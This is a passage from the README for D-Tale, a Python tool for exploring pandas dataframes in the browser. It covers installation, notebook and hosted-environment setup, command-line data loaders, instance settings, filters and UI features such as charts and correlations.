Formats, Describe (Column Analysis) Charts Network Viewer Hotkeys Menu Functions Depending on Browser Dimensions For Developers Cloning Running Tests Linting Formatting JS Docker Development Adding Language Support Global State/Data Storage Startup Behavior Documentation Dependencies Acknowledgements License Where To get It The source code is currently hosted on GitHub at: https://github.com/man-group/dtale Binary installers for the latest released version are available at the Python package index and on conda using conda-forge. # conda conda install dtale -c conda-forge # if you want to also use \"Export to PNG\" for charts conda install -c plotly python-kaleido # or PyPI pip install dtale Getting Started PyCharm jupyter Python Terminal This comes courtesy of PyCharm Feel free to invoke python or ipython directly and use the commands in the screenshot above and it should work Issues With Windows Firewall If you run into issues with viewing D-Tale in your browser on Windows please try making Python public under \"Allowed Apps\" in your Firewall configuration. Here is a nice article: How to Allow Apps to Communicate Through the Windows Firewall Additional functions available programmatically import dtale import pandas as pd df = pd.DataFrame([dict(a=1,b=2,c=3)]) # Assigning a reference to a running D-Tale process d = dtale.show(df) # Accessing data associated with D-Tale process tmp = d.data.copy() tmp['d'] = 4 # Altering data associated with D-Tale process # FYI: this will clear any front-end settings you have at the time for this process (filter, sorts, formatting) d.data = tmp # Shutting down D-Tale process d.kill() # using Python's `webbrowser` package it will try and open your server's default browser to this process d.open_browser() # There is also some helpful metadata about the process d._data_id # the process's data identifier d._url # the url to access the process d2 = dtale.get_instance(d._data_id) # returns a new reference to the instance running at that data_id dtale.instances() # prints a list of all ids & urls of running D-Tale sessions Duplicate data check To help guard against users loading the same data to D-Tale multiple times and thus eating up precious memory, we have a loose check for duplicate input data. The check runs the following: Are row & column count the same as a previously loaded piece of data? Are the names and order of columns the same as a previously loaded piece of data? If both these conditions are true then you will be presented with an error and a link to the previously loaded data. Here is an example of how the interaction looks: As A Script D-Tale can be run as script by adding subprocess=False to your dtale.show command. Here is an example script: import dtale import pandas as pd if __name__ == '__main__': dtale.show(pd.DataFrame([1,2,3,4,5]), subprocess=False) Jupyter Notebook Within any jupyter (ipython) notebook executing a cell like this will display a small instance of D-Tale in the output cell. Here are some examples: dtale.show assignment instance If you are running ipython<=5.0 then you also have the ability to adjust the size of your output cell for the most recent instance displayed: One thing of note is that a lot of the modal popups you see in the standard browser version will now open separate browser windows for spacial convienence: Column Menus Correlations Describe Column Analysis Instances JupyterHub w/ Jupyter Server Proxy JupyterHub has an extension that allows to proxy port for user, JupyterHub Server Proxy To me it seems like this extension might be the best solution to getting D-Tale running within kubernetes. Here's how to use it: import pandas as pd import dtale import dtale.app as dtale_app dtale_app.JUPYTER_SERVER_PROXY = True dtale.show(pd.DataFrame([1,2,3])) Notice the command dtale_app.JUPYTER_SERVER_PROXY = True this will make sure that any D-Tale instance will be served with the jupyter server proxy application root prefix: /user/{jupyter username}/proxy/{dtale instance port}/ One thing to note is that if you try to look at the _main_url of your D-Tale instance in your notebook it will not include the hostname or port: import pandas as pd import dtale import dtale.app as dtale_app dtale_app.JUPYTER_SERVER_PROXY = True d = dtale.show(pd.DataFrame([1,2,3])) d._main_url # /user/johndoe/proxy/40000/dtale/main/1 This is because it's very hard to promgramatically figure out the host/port that your notebook is running on. So if you want to look at _main_url please be sure to preface it with: http[s]://[jupyterhub host]:[jupyterhub port] If for some reason jupyterhub changes their API so that the application root changes you can also override D-Tale's application root by using the app_root parameter to the show() function: import pandas as pd import dtale import dtale.app as dtale_app dtale.show(pd.DataFrame([1,2,3]), app_root='/user/johndoe/proxy/40000/`) Using this parameter will only apply the application root to that specific instance so you would have to include it on every call to show(). JupyterHub w/ Kubernetes Please read this post Docker Container If you have D-Tale installed within your docker container please add the following parameters to your docker run command. On a Mac: docker run -h `hostname` -p 40000:40000 -h this will allow the hostname (and not the PID of the docker container) to be available when building D-Tale URLs -p access to port 40000 which is the default port for running D-Tale On Windows: docker run -p 40000:40000 -p access to port 40000 which is the default port for running D-Tale D-Tale URL will be http://127.0.0.1:40000/ Everything Else: docker run -h `hostname` --network host -h this will allow the hostname (and not the PID of the docker container) to be available when building D-Tale URLs --network host this will allow access to as many ports as needed for running D-Tale processes Google Colab This is a hosted notebook site and thanks to Colab's internal function google.colab.output.eval_js & the JS function google.colab.kernel.proexyPort users can run D-Tale within their notebooks. DISCLAIMER: It is import that you set USE_COLAB to true when using D-Tale within this service. Here is an example: import pandas as pd import dtale import dtale.app as dtale_app dtale_app.USE_COLAB = True dtale.show(pd.DataFrame([1,2,3])) If this does not work for you try using USE_NGROK which is described in the next section. Kaggle This is yet another hosted notebook site and thanks to the work of flask_ngrok users can run D-Tale within their notebooks. DISCLAIMER: It is import that you set USE_NGROK to true when using D-Tale within this service. Here is an example: import pandas as pd import dtale import dtale.app as dtale_app dtale_app.USE_NGROK = True dtale.show(pd.DataFrame([1,2,3])) Here are some video tutorials of each: Service Tutorial Addtl Notes Google Colab Kaggle make sure you switch the \"Internet\" toggle to \"On\" under settings of your notebook so you can install the egg from pip It is important to note that using NGROK will limit you to 20 connections per mintue so if you see this error: Wait a little while and it should allow you to do work again. I am actively working on finding a more sustainable solution similar to what I did for google colab. Binder I have built a repo which shows an example of how to run D-Tale within Binder here. The important take-aways are: you must have jupyter-server-proxy installed look at the environment.yml file to see how to add it to your environment look at the postBuild file for how to activate it on startup R with Reticulate I was able to get D-Tale running in R using reticulate. Here is an example: library('reticulate') dtale <- import('dtale') df <- read.csv('https://vincentarelbundock.github.io/Rdatasets/csv/boot/acme.csv') dtale$show(df, subprocess=FALSE, open_browser=TRUE) Now the problem with doing this is that D-Tale is not running as a subprocess so it will block your R console and you'll lose out the following functions: manipulating the state of your data from your R console adding more data to D-Tale open_browser=TRUE isn't required and won't work if you don't have a default browser installed on your machine. If you don't use that parameter simply copy & paste the URL that gets printed to your console in the browser of your choice. I'm going to do some more digging on why R doesn't seem to like using python subprocesses (not sure if it something with how reticulate manages the state of python) and post any findings to this thread. Here's some helpful links for getting setup: reticulate installing python packages Startup with No Data It is now possible to run D-Tale with no data loaded up front. So simply call dtale.show() and this will start the application for you and when you go to view it you will be presented with a screen where you can upload either a CSV or TSV file for data. Once you've loaded a file it will take you directly to the standard data grid comprised of the data from the file you loaded. This might make it easier to use this as an on demand application within a container management system like kubernetes. You start and stop these on demand and you'll be presented with a new instance to load any CSV or TSV file to! Command-line Base CLI options (run dtale --help to see all options available) Prop Description --host the name of the host you would like to use (most likely not needed since socket.gethostname() should figure this out) --port the port you would like to assign to your D-Tale instance --name an optional name you can assign to your D-Tale instance (this will be displayed in the <title> & Instances popup) --debug turn on Flask's \"debug\" mode for your D-Tale instance --no-reaper flag to turn off auto-reaping subprocess (kill D-Tale instances after an hour of inactivity), good for long-running displays --open-browser flag to automatically open up your server's default browser to your D-Tale instance --force flag to force D-Tale to try an kill any pre-existing process at the port you've specified so it can use it Loading data from arctic(high performance datastore for pandas dataframes) (this requires either installing arctic or dtale[arctic]) dtale --arctic-host mongodb://localhost:27027 --arctic-library jdoe.my_lib --arctic-node my_node --arctic-start 20130101 --arctic-end 20161231 Loading data from CSV dtale --csv-path /home/jdoe/my_csv.csv --csv-parse_dates date Loading data from EXCEL dtale --excel-path /home/jdoe/my_csv.xlsx --excel-parse_dates date dtale --excel-path /home/jdoe/my_csv.xls --excel-parse_dates date Loading data from JSON dtale --json-path /home/jdoe/my_json.json --json-parse_dates date or dtale --json-path http://json-endpoint --json-parse_dates date Loading data from R Datasets dtale --r-path /home/jdoe/my_dataset.rda Loading data from SQLite DB Files dtale --sqlite-path /home/jdoe/test.sqlite3 --sqlite-table test_table Custom Command-line Loaders Loading data from a Custom loader Using the DTALE_CLI_LOADERS environment variable, specify a path to a location containing some python modules Any python module containing the global variables LOADER_KEY & LOADER_PROPS will be picked up as a custom loader LOADER_KEY: the key that will be associated with your loader. By default you are given arctic & csv (if you use one of these are your key it will override these) LOADER_PROPS: the individual props available to be specified. For example, with arctic we have host, library, node, start & end. If you leave this property as an empty list your loader will be treated as a flag. For example, instead of using all the arctic properties we would simply specify --arctic (this wouldn't work well in arctic's case since it depends on all those properties) You will also need to specify a function with the following signature def find_loader(kwargs) which returns a function that returns a dataframe or None Here is an example of a custom loader: from dtale.cli.clickutils import get_loader_options ''' IMPORTANT!!! This global variable is required for building any customized CLI loader. When find loaders on startup it will search for any modules containing the global variable LOADER_KEY. ''' LOADER_KEY = 'testdata' LOADER_PROPS = ['rows', 'columns'] def test_data(rows, columns): import pandas as pd import numpy as np import random from past.utils import old_div from pandas.tseries.offsets import Day from dtale.utils import dict_merge import string now = pd.Timestamp(pd.Timestamp('now').date()) dates = pd.date_range(now - Day(364), now) num_of_securities = max(old_div(rows, len(dates)), 1) # always have at least one security securities = [ dict(security_id=100000 + sec_id, int_val=random.randint(1, 100000000000), str_val=random.choice(string.ascii_letters) * 5) for sec_id in range(num_of_securities) ] data = pd.concat([ pd.DataFrame([dict_merge(dict(date=date), sd) for sd in securities]) for date in dates ], ignore_index=True)[['date', 'security_id', 'int_val', 'str_val']] col_names = ['Col{}'.format(c) for c in range(columns)] return pd.concat([data, pd.DataFrame(np.random.randn(len(data), columns), columns=col_names)], axis=1) # IMPORTANT!!! This function is required for building any customized CLI loader. def find_loader(kwargs): test_data_opts = get_loader_options(LOADER_KEY, LOADER_PROPS, kwargs) if len([f for f in test_data_opts.values() if f]): def _testdata_loader(): return test_data(int(test_data_opts.get('rows', 1000500)), int(test_data_opts.get('columns', 96))) return _testdata_loader return None In this example we simplying building a dataframe with some dummy data based on dimensions specified on the command-line: --testdata-rows --testdata-columns Here's how you would use this loader: DTALE_CLI_LOADERS=./path_to_loaders bash -c 'dtale --testdata-rows 10 --testdata-columns 5' Authentication You can choose to use optional authentication by adding the following to your D-Tale .ini file (directions here): [auth] active = True username = johndoe password = 1337h4xOr Or you can call the following: import dtale.global_state as global_state global_state.set_auth_settings({'active': True, 'username': 'johndoe', 'password': '1337h4x0r'}) If you have done this before initially starting D-Tale it will have authentication applied. If you are adding this after starting D-Tale you will have to kill your service and start it over. When opening your D-Tale session you will be presented with a screen like this: From there you can enter the credentials you either set in your .ini file or in your call to dtale.global_state.set_auth_settings and you will be brought to the main grid as normal. You will now have an additional option in your main menu to logout: Instance Settings Users can set front-end properties on their instances programmatically in the dtale.show function or by calling the update_settings function on their instance. For example: import dtale import pandas as pd df = pd.DataFrame(dict( a=[1,2,3,4,5], b=[6,7,8,9,10], c=['a','b','c','d','e'] )) dtale.show( df, locked=['c'], column_formats={'a': {'fmt': '0.0000'}}, nan_display='...', background_mode='heatmap-col', sort=[('a','DESC')], vertical_headers=True, ) or import dtale import pandas as pd df = pd.DataFrame(dict( a=[1,2,3,4,5], b=[6,7,8,9,10], c=['a','b','c','d','e'] )) d = dtale.show( df ) d.update_settings( locked=['c'], column_formats={'a': {'fmt': '0.0000'}}, nan_display='...', background_mode='heatmap-col', sort=[('a','DESC')], vertical_headers=True, ) d Here's a short description of each instance setting available: show_columns A list of column names you would like displayed in your grid. Anything else will be hidden. hide_columns A list of column names you would like initially hidden from the grid display. column_formats A dictionary of column name keys and their front-end display configuration. Here are examples of the different format configurations: Numeric: {'fmt': '0.00000'} String: {'fmt': {'truncate': 10}} truncate string values to no more than 10 characters followed by an ellipses {'fmt': {'link': True}} if your strings are URLs convert them to clickable links {'fmt': {'html': True}} if your strings are HTML fragments render them as HTML Date: {'fmt': 'MMMM Do YYYY, h:mm:ss a'} uses Moment.js formatting nan_display Converts any nan values in your dataframe to this when it is sent to the browser (doesn't actually change the state of your dataframe) sort List of tuples which sort your dataframe (EX: [('a', 'ASC'), ('b', 'DESC')]) locked List of column names which will be locked to the right side of your grid while you scroll to the left. background_mode A string denoting one of the many background displays available in D-Tale. Options are: heatmap-all: turn on heatmap for all numeric columns where the colors are determined by the range of values over all numeric columns combined heatmap-col: turn on heatmap for all numeric columns where the colors are determined by the range of values in the column heatmap-col-[column name]: turn on heatmap highlighting for a specific column dtypes: highlight columns based on it's data type missing: highlight any missing values (np.nan, empty strings, strings of all spaces) outliers: highlight any outliers range: highlight values for any matchers entered in the \"range_highlights\" option lowVariance: highlight values with a low variance range_highlights Dictionary of column name keys and range configurations which if the value for that column exists then it will be shaded that color. Here is an example input: 'a': { 'active': True, 'equals': {'active': True, 'value': 3, 'color': {'r': 255, 'g': 245, 'b': 157, 'a': 1}}, # light yellow 'greaterThan': {'active': True, 'value': 3, 'color': {'r': 80, 'g': 227, 'b': 194, 'a': 1}}, # mint green 'lessThan': {'active': True, 'value': 3, 'color': {'r': 245, 'g': 166, 'b': 35, 'a': 1}}, # orange } vertical_headers If set to True then the headers in your grid will be rotated 90 degrees vertically to conserve width. Predefined Filters Users can build their own custom filters which can be used from the front-end using the following code snippet: import pandas as pd import dtale import dtale.predefined_filters as predefined_filters import dtale.global_state as global_state global_state.set_app_settings(dict(open_predefined_filters_on_startup=True)) predefined_filters.set_filters([ { \"name\": \"A and B > 2\", \"column\": \"A\", \"description\": \"Filter A with B greater than 2\", \"handler\": lambda df, val: df[(df[\"A\"] == val) & (df[\"B\"] > 2)], \"input_type\": \"input\", \"default\": 1, \"active\": False, }, { \"name\": \"A and (B % 2) == 0\", \"column\": \"A\", \"description\": \"Filter A with B mod 2 equals zero (is even)\", \"handler\": lambda df, val: df[(df[\"A\"] == val) & (df[\"B\"] % 2 == 0)], \"input_type\": \"select\", \"default\": 1, \"active\": False, }, { \"name\": \"A in values and (B % 2) == 0\", \"column\": \"A\", \"description\": \"A is within a group of values and B mod 2 equals zero (is even)\", \"handler\": lambda df, val: df[df[\"A\"].isin(val) & (df[\"B\"] % 2 == 0)], \"input_type\": \"multiselect\", \"default\": [1], \"active\": True, } ]) df = pd.DataFrame( ([[1, 2, 3, 4, 5, 6], [7, 8, 9, 10, 11, 12], [13, 14, 15, 16, 17, 18]]), columns=['A', 'B', 'C', 'D', 'E', 'F'] ) dtale.show(df) This code illustrates the types of inputs you can have on the front end: input: just a simple text input box which users can enter any value they want (if the value specified for \"column\" is an int or float it will try to convert the string to that data type) and it will be passed to the handler select: this creates a dropdown populated with the unique values of \"column\" (an asynchronous dropdown if the column has a large amount of unique values) multiselect: same as \"select\" but it will allow you to choose multiple values (handy if you want to perform an isin operation in your filter) Here is a demo of the functionality: If there are any new types of inputs you would like available please don't hesitate to submit a request on the \"Issues\" page of the repo. Using Swifter Swifter is a package which will increase performance on any apply() function on a pandas series or dataframe. If install the package in your virtual environment pip install swifter # or pip install dtale[swifter] It will be used for the following operations: Standard dataframe formatting in the main grid & chart display Column Builders Type Conversions string hex -> int or float int or float -> hex mixed -> boolean int -> timestamp date -> int Similarity Distance Calculation Handling of empty strings when calculating missing counts Building unique values by data type in \"Describe\" popup Accessing CLI Loaders in Notebook or Console I am pleased to announce that all CLI loaders will be available within notebooks & consoles. Here are some examples (the last working if you've installed dtale[arctic]): dtale.show_csv(path='test.csv', parse_dates=['date']) dtale.show_csv(path='http://csv-endpoint', index_col=0) dtale.show_excel(path='test.xlsx', parse_dates=['date']) dtale.show_excel(path='test.xls', sheet=) dtale.show_excel(path='http://excel-endpoint', index_col=0) dtale.show_json(path='http://json-endpoint', parse_dates=['date']) dtale.show_json(path='test.json', parse_dates=['date']) dtale.show_r(path='text.rda') dtale.show_arctic(host='host', library='library', node='node', start_date='20200101', end_date='20200101') UI Once you have kicked off your D-Tale session please copy & paste the link on the last line of output in your browser Dimensions/Ribbon Menu/Main Menu The information in the upper right-hand corner gives grid dimensions lower-left => row count upper-right => column count Ribbon Menu hovering around to top of your browser will display a menu items (similar to the ones in the main menu) across the top of the screen to close the menu simply click outside the menu and/or dropdowns from the menu Main Menu clicking the triangle displays the menu of standard functions (click outside menu to close it) Header The header gives users an idea of what operations have taken place on your data (sorts, filters, hidden columns). These values will be persisted across broswer instances. So if you perform one of these operations and then send a link to one of your colleagues they will see the same thing :) Notice the \"X\" icon on the right of each display. Clicking this will remove those operations. When performing multiple of the same operation the description will become too large to display so the display will truncate the description and if users click it they will be presented with a tooltip where you can crop individual operations. Here are some examples: Sorts Filters Hidden Columns Resize Columns Currently there are two ways which you can resize columns. Dragging the right border of the column's header cell. Altering the \"Maximum Column Width\" property from the ribbon menu. Side Note: You can also set the max_column_width property ahead of time in your global configuration or programmatically using: import dtale.global_state as global_state global_state.set_app_settings(dict(max_column_width=100)) Editing Cells You may edit any cells in your grid (with the exception of the row indexes or headers, the ladder can be edited using the Rename column menu function). In order to edit a cell simply double-click on it. This will convert it into a text-input field and you should see a blinking cursor. In addition to turning that cell into an input it will also display an input at the top of the screen for better viewing of long strings. It is assumed that the value you type in will match the data type of the column you editing. For example: integers -> should be a valid positive or negative integer float -> should be a valid positive or negative float string -> any valid string will do category -> either a pre-existing category or this will create a new category for (so beware!) date, timestamp, timedelta -> should be valid string versions of each boolean -> any string you input will be converted to lowercase and if it equals \"true\" then it will make the cell True, otherwise False Users can make use of two protected values as well: \"nan\" -> numpy.nan \"inf\" -> numpy.inf To save your change simply press \"Enter\" or to cancel your changes press \"Esc\". If there is a conversion issue with the value you have entered it will display a popup with the specific exception in question. Here's a quick demo: Here's a demo of editing cells with long strings: Copy Cells Into Clipboard Select Copy Paste One request that I have heard time and time again while working on D-Tale is \"it would be great to be able to copy a range of cells into excel\". Well here is how that is accomplished: Shift + Click on a cell Shift + Click on another cell (this will trigger a popup) Choose whether you want to include headers in your copy by clicking the checkbox Click Yes Go to your excel workbook and execute Ctrl + V or manually choose \"Paste\" You can also paste this into a standard text editor and what you're left with is tab-delimited data Main Menu Functions XArray Operations Convert To XArray: If you have are currently viewing a pandas dataframe in D-Tale you will be given this option to convert your data to an xarray.Dataset. It is as simple as selecting one or many columns as an index and then your dataframe will be converted to a dataset (df.set_index([...]).to_xarray()) which makes toggling between indexes slices much easier. XArray Dimensions: If you are currently viewing data associated with an xarray.Dataset you will be given the ability to toggle which dimension coordinates you're viewing by clicking this button. You can select values for all, some or none (all data - no filter) of your coordinates and the data displayed in your grid will match your selections. Under the hood the code being executed is as follows: ds.sel(dim1=coord1,...).to_dataframe() Describe View all the columns & their data types as well as individual details of each column Data Type Display Notes date string If you have less than or equal to 100 unique values they will be displayed at the bottom of your popup int Anything with standard numeric classifications (min, max, 25%, 50%, 75%) will have a nice boxplot with the mean (if it exists) displayed as an outlier if you look closely. float Outlier Detection When viewing integer & float columns in the \"Describe\" popup you will see in the lower right-hand corner a toggle for Uniques & Outliers. Outliers Filter If you click the \"Outliers\" toggle this will load the top 100 outliers in your column based on the following code snippet: s = df[column] q1 = s.quantile(0.25) q3 = s.quantile(0.75) iqr = q3 - q1 iqr_lower = q1 - 1.5 * iqr iqr_upper = q3 + 1.5 * iqr outliers = s[(s < iqr_lower) | (s > iqr_upper)] If you click on the \"Apply outlier filter\" link this will add an addtional \"outlier\" filter for this column which can be removed from the header or the custom filter shown in picture above to the right. Custom Filter Apply a custom pandas query to your data (link to pandas documentation included in popup) Editing Result You can also see any outlier or column filters you've applied (which will be included in addition to your custom query) and remove them if you'd like. Context Variables are user-defined values passed in via the context_variables argument to dtale.show(); they can be referenced in filters by prefixing the variable name with '@'. For example, here is how you can use context variables in a pandas query: import pandas as pd df = pd.DataFrame([ dict(name='Joe', age=7), dict(name='Bob', age=23), dict(name='Ann', age=45), dict(name='Cat', age=88), ]) two_oldest_ages = df['age'].nlargest(2) df.query('age in @two_oldest_ages') And here is how you would pass that context variable to D-Tale: dtale.show(df, context_variables=dict(two_oldest_ages=two_oldest_ages)) Here's some nice documentation on the performance of pandas queries Dataframe Functions This video shows you how to build the following: Numeric: adding/subtracting two columns or columns with static values Bins: bucketing values using pandas cut & qcut as well as assigning custom labels Dates: retrieving date properties (hour, weekday, month...) as well as conversions (month end) Random: columns of data type (int, float, string & date) populated with random uniformly distributed values. Type Conversion: switch columns from one data type to another, fun. Merge & Stack This feature allows users to merge or stack (vertically concatenate) dataframes they have loaded into D-Tale. They can also upload additional data to D-Tale while wihin this feature. The demo shown above goes over the following actions: Editing of parameters to either a pandas merge or stack (vertical concatenation) of dataframes Viewing direct examples of each from the pandas documentation Selection of dataframes Uploading of additional dataframes from an excel file Viewing code & resulting data from a merge or stack Summarize Data This is very powerful functionality which allows users to create a new data from currently loaded data. The operations currently available are: Aggregation: consolidate data by running different aggregations on columns by a specific index Pivot: this is simple wrapper around pandas.Dataframe.pivot and pandas.pivot_table Transpose: transpose your data on a index (be careful dataframes can get very wide if your index has many unique values) Function Data No Reshaping Duplicates Remove duplicate columns/values from your data as well as extract duplicates out into separate instances. The folowing screen shots are for a dataframe with the following data: Function Description Preview Remove Duplicate Columns Remove any columns that contain the same data as another and you can either keep the first, last or none of these columns that match this criteria. You can test which columns will be removed by clicking the \"View Duplicates\" button. Remove Duplicate Column Names Remove any columns with the same name (name comparison is case-insensitive) and you can either keep the first, last or none of these columns that match this criteria. You can test which columns will be removed by clicking the \"View Duplicates\" button. Remove Duplicate Rows Remove any rows from your dataframe where the values of a subset of columns are considered duplicates. You can choose to keep the first, last or none of the rows considered duplicated. Show Duplicates Break any duplicate rows (based on a subset of columns) out into another dataframe viewable in your D-Tale session. You can choose to view all duplicates or select specific groups based on the duplicated value. Missing Analysis Display charts analyzing the presence of missing (NaN) data in your dataset using the missingno pacakage. You can also open them in a tab by themselves or export them to a static PNG using the links in the upper right corner. You can also close the side panel using the ESC key. Chart Sample Matrix Bar Heatmap Dendrogram Charts Build custom charts based off your data(powered by plotly/dash). The Charts will open in a tab because of the fact there is so much functionality offered there you'll probably want to be able to reference the main grid data in the original tab To build a chart you must pick a value for X & Y inputs which effectively drive what data is along the X & Y axes If you are working with a 3-Dimensional chart (heatmap, 3D Scatter, Surface) you'll need to enter a value for the Z axis as well Once you have entered all the required axes a chart will be built If your data along the x-axis (or combination of x & y in the case of 3D charts) has duplicates you have three options: Specify a group, which will create series for each group Specify an aggregation, you can choose from one of the following: Count, First, Last, Mean, Median, Minimum, Maximum, Standard Deviation, Variance, Mean Absolute Deviation, Product of All Items, Sum, Rolling Specifying a \"Rolling\" aggregation will also require a Window & a Computation (Correlation, Count, Covariance, Kurtosis, Maximum, Mean, Median, Minimum, Skew, Standard Deviation, Sum or Variance) For heatmaps you will also have access to the \"Correlation\" aggregation since viewing correlation matrices in heatmaps is very useful. This aggregation is not supported elsewhere Specify both a group & an aggregation You now have the ability to toggle between different chart types: line, bar, pie, wordcloud, heatmap, 3D scatter & surface If you have specified a group then you have the ability between showing all series in one chart and breaking each series out into its own chart \"Chart per Group\" Here are some examples: Chart Type Chart Chart per Group line bar stacked pie wordcloud heatmap 3D scatter surface Maps (Scatter GEO) Maps (Choropleth) Y-Axis Toggling Users now have the ability to toggle between 3 different behaviors for their y-axis display: Default: selecting this option will use the default behavior that comes with plotly for your chart's y-axis Single: this allows users to set the range of all series in your chart to be on the same basis as well as making that basis (min/max) editable Multi: this allows users to give each series its own y-axis and making that axis' range editable Here's a quick tutorial: And some screenshots: Default Single Multi With a bar chart that only has a single Y-Axis you have the ability to sort the bars based on the values for the Y-Axis Pre-sort Post-sort Popup Charts Viewing multiple charts at once and want to separate one out into its own window or simply move one off to the side so you can work on building another for comparison? Well now you can by clicking the \"Popup\" button Copy Link Want to send what you're looking at to someone else? Simply click the \"Copy Link\" button and it will save a pre-populated chart URL into your clipboard. As long as your D-Tale process is still running when that link is opened you will see your original chart. Exporting Charts You can now export your dash charts (with the exception of Wordclouds) to static HTML files which can be emailed to others or saved down to be viewed at a later time. The best part is that all of the javascript for plotly is embedded in these files so the nice zooming, panning, etc is still available! Exporting CSV I've been asked about being able to export the data that is contained within your chart to a CSV for further analysis in tools like Excel. This button makes that possible. OFFLINE CHARTS Want to run D-Tale in a jupyter notebook and build a chart that will still be displayed even after your D-Tale process has shutdown? Now you can! Here's an example code snippet show how to use it: import dtale def test_data(): import random import pandas as pd import numpy as np df = pd.DataFrame([ dict(x=i, y=i % 2) for i in range(30) ]) rand_data = pd.DataFrame(np.random.randn(len(df), 5), columns=['z{}'.format(j) for j in range(5)]) return pd.concat([df, rand_data], axis=1) d = dtale.show(test_data()) d.offline_chart(chart_type='bar', x='x', y='z3', agg='sum') Pro Tip: If generating offline charts in jupyter notebooks and you run out of memory please add the following to your command-line when starting jupyter --NotebookApp.iopub_data_rate_limit=1.0e10 Disclaimer: Long Running Chart Requests If you choose to build a chart that requires a lot of computational resources then it will take some time to run. Based on the way Flask & plotly/dash interact this will block you from performing any other request until it completes. There are two courses of action in this situation: Restart your jupyter notebook kernel or python console Open a new D-Tale session on a different port than the current session. You can do that with the following command: dtale.show(df, port=[any open port], force=True) If you miss the legacy (non-plotly/dash) charts, not to worry! They are still available from the link in the upper-right corner, but on for a limited time... Here is the documentation for those: Legacy Charts Your Feedback is Valuable This is a very powerful feature with many more features that could be offered (linked subplots, different statistical aggregations, etc...) so please submit issues :) Network Viewer This tool gives users the ability to visualize directed graphs. For the screenshots I'll beshowing for this functionality we'll be working off a dataframe with the following data: Start by selecting columns containing the \"To\" and \"From\" values for the nodes in you network and then click \"Load\": You can also see instructions on to interact with the network by expanding the directions section by clicking on the header \"Network Viewer\" at the top. You can also view details about the network provided by the package networkx by clicking the header \"Network Analysis\". Select a column containing weighting for the edges of the nodes in the \"Weight\" column and click \"Load\": Select a column containing group information for each node in the \"From\" column by populating \"Group\" and then clicking \"Load\": Perform shortest path analysis by doing a Shift+Click on two nodes: View direct descendants of each node by clicking on it: You can zoom in on nodes by double-clicking and zoom back out by pressing \"Esc\". Correlations Shows a pearson correlation matrix of all numeric columns against all other numeric columns By default, it will show a grid of pearson correlations (filtering available by using drop-down see 2nd table of screenshots) If you have a date-type column, you can click an individual cell and see a timeseries of pearson correlations for that column combination Currently if you have multiple date-type columns you will have the ability to toggle between them by way of a drop-down Furthermore, you can click on individual points in the timeseries to view the scatter plot of the points going into that correlation Within the scatter plot section you can also view the details of the PPS for those data points in the chart by hovering over the number next to \"PPS\" Matrix PPS Timeseries Scatter Col1 Filtered Col2 Filtered Col1 & Col2 Filtered When the data being viewed in D-Tale has date or timestamp columns but for each date/timestamp vlaue there is only one row of data the behavior of the Correlations popup is a little different Instead of a timeseries correlation chart the user is given a rolling correlation chart which can have the window (default: 10) altered The scatter chart will be created when a user clicks on a point in the rollign correlation chart. The data displayed in the scatter will be for the ranges of dates involved in the rolling correlation for that date. Data Correlations Predictive Power Score Predictive Power Score (using the package ppscore) is an asymmetric, data-type-agnostic score that can detect linear or non-linear relationships between two columns. The score ranges from 0 (no predictive power) to 1 (perfect predictive power). It can be used as an alternative to the correlation (matrix). WARNING: This could take a while to load. This page works similar to the Correlations page but uses the PPS calcuation to populate the grid and by clicking on cells you can view the details of the PPS for those two columns in question. | Heat Map This will hide any non-float or non-int columns (with the exception of the index on the right) and apply a color to the background of each cell. Each float is renormalized to be a value between 0 and 1.0 You have two options for the renormalization By Col: each value is calculated based on the min/max of its column Overall: each value is caluclated by the overall min/max of all the non-hidden float/int columns in the dataset Each renormalized value is passed to a color scale of red(0) - yellow(0.5) - green(1.0) Turn off Heat Map by clicking menu option you previously selected one more time Highlight Dtypes This is a quick way to check and see if your data has been categorized correctly. By clicking this menu option it will assign a specific background color to each column of a specific data type. category timedelta float int date string bool purple orange green light blue pink white yellow Highlight Missing Any cells which contain nan values will be highlighted in yellow. Any string column cells which are empty strings or strings consisting only of spaces will be highlighted in orange. will be prepended to any column header which contains missing values. Highlight Outliers Highlight any cells for numeric columns which surpass the upper or lower bounds of a custom outlier computation. Lower bounds outliers will be on a red scale, where the darker reds will be near the maximum value for the column. Upper bounds outliers will be on a blue scale, where the darker blues will be closer to the minimum value for the column. will be prepended to any column header which contains outliers. Highlight Range Highlight any range of numeric cells based on three different criteria: equals greater than less than You can activate as many of these criteria as you'd like nad they will be treated as an \"or\" expression. For example, (x == 0) or (x < -1) or (x > 1) Selections Output Low Variance Flag Show flags on column headers where both these conditions are true: Count of unique values / column size < 10% Count of most common value / Count of second most common value > 20 Here's an example of what this will look like when you apply it: | Code Exports Code Exports are small snippets of code representing the current state of the grid you're viewing including things like: columns built filtering sorting Other code exports available are: Describe (Column Analysis) Correlations (grid, timeseries chart & scatter chart) Charts built using the Chart Builder Type Code Export Main Grid Histogram Describe Correlation Grid Correlation Timeseries Correlation Scatter Charts Export CSV Export your current data to either a CSV or TSV file: Load Data & Sample Datasets So either when starting D-Tale with no pre-loaded data or after you've already loaded some data you now have the ability to load data or choose from some sample datasets directly from the GUI: Here's the options at you disposal: Load a CSV/TSV file by dragging a file to the dropzone in the top or select a file by clicking the dropzone Load a CSV/TSV or JSON directly from the web by entering a URL (also throw in a proxy if you are using one) Choose from one of our sample datasets: US COVID-19 data from NY Times (updated daily) Script breakdowns of popular shows Seinfeld & The Simpsons Movie dataset containing release date, director, actors, box office, reviews... Video games and their sales pandas.util.testing.makeTimeDataFrame Instances This will give you information about other D-Tale instances are running under your current Python process. For example, if you ran the following script: import pandas as pd import dtale dtale.show(pd.DataFrame([dict(foo=1, bar=2, biz=3, baz=4, snoopy_D_O_double_gizzle=5)])) dtale.show(pd.DataFrame([ dict(a=1, b=2, c=3, d=4), dict(a=2, b=3, c=4, d=5), dict(a=3, b=4, c=5, d=6), dict(a=4, b=5, c=6, d=7) ])) dtale.show(pd.DataFrame([range(6), range(6), range(6), range(6), range(6), range(6)]), name=\"foo\") This will make the Instances button available in all 3 of these D-Tale instances. Clicking that button while in the first instance invoked above will give you this popup: The grid above contains the following information: Process: timestamp when the process was started along with the name (if specified in dtale.show()) Rows: number of rows Columns: number of columns Column Names: comma-separated string of column names (only first 30 characters, hover for full listing) Preview: this button is available any of the non-current instances. Clicking this will bring up left-most 5X5 grid information for that instance The row highlighted in green signifys the current D-Tale instance Any other row can be clicked to switch to that D-Tale instance Here is an example of clicking the \"Preview\" button: About This will give you information about what version of D-Tale you're running as well as if its out of date to whats on PyPi. Up To Date Out Of Date Refresh Widths Mostly a fail-safe in the event that your 